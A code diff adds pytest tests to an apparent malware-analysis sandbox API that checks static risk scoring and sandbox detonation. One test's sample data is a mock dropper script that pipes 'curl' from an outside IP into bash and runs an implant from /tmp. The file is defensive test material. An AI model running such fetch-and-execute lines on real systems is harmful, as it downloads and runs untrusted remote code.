@@ -507,3 +507,53 @@ def test_samples_list_counts_runs_using_same_name(client):
         s for s in client.get("/samples").json()["samples"] if s["sample_id"] == meta["sample_id"]
     )
     assert row["runs_count"] == 2
+
+
+def test_sample_static_analysis_extended_intelligence(client):
+    # Upload a shell script with suspicious payload markers
+    script_data = (
+        b"#!/bin/bash\n"
+        b"# Dropper and reverse shell payload\n"
+        b"curl -s http://185.220.101.5/beacon.sh | bash\n"
+        b"memfd_create dropper\n"
+        b"chmod +x /tmp/implant.bin\n"
+        b"/tmp/implant.bin --inject\n"
+    )
+    meta = _upload(client, script_data, "implant_dropper.sh").json()
+    sample_id = meta["sample_id"]
+
+    resp = client.get(f"/samples/{sample_id}/static")
+    assert resp.status_code == 200
+    data = resp.json()
+
+    assert data["available"] is True
+    assert "entropy_histogram" in data
+    assert len(data["entropy_histogram"]) == 32
+    assert "categorized_strings" in data
+    assert "network" in data["categorized_strings"]
+    assert "commands" in data["categorized_strings"]
+    assert "file_paths" in data["categorized_strings"]
+    assert "static_risk_score" in data
+    assert data["static_risk_score"] > 0
+    assert "risk_factors" in data
+    assert len(data["risk_factors"]) > 0
+
+
+def test_sample_dynamic_detonation_endpoint(client):
+    # Upload a benign bash script for quick sandbox detonation
+    script_data = b"#!/bin/bash\necho 'OutPost Sandbox Executed' > /tmp/outpost_test.txt\necho 'Done'\n"
+    meta = _upload(client, script_data, "detonate_test.sh").json()
+    sample_id = meta["sample_id"]
+
+    resp = client.post(f"/samples/{sample_id}/detonate?timeout=5")
+    assert resp.status_code == 200
+    res = resp.json()
+
+    assert res["sample_id"] == sample_id
+    assert "run_id" in res
+    assert res["exit_code"] == 0
+    assert "terminal_output" in res
+    assert "OutPost Sandbox Executed" in res["terminal_output"] or "Done" in res["terminal_output"]
+    assert "events_count" in res
+    assert "process_tree" in res
+
